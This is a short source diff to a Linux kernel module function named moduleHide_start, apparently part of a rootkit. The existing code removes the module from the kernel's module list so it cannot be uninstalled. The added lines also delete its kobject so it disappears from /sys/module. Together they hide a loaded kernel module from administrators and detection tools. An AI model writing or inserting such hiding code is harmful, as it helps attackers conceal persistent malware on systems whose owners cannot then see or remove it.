@@ -22,6 +22,9 @@ int moduleHide_start(void) {
 	// While it is absent form the list, the module can't be uninstalled anymore.
 	prev = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
+   // Hide from /sys/module
+   kobject_del(&THIS_MODULE->mkobj.kobj);
+   list_del(&THIS_MODULE->mkobj.kobj.entry); 
    started = true;
 
 	return 0;
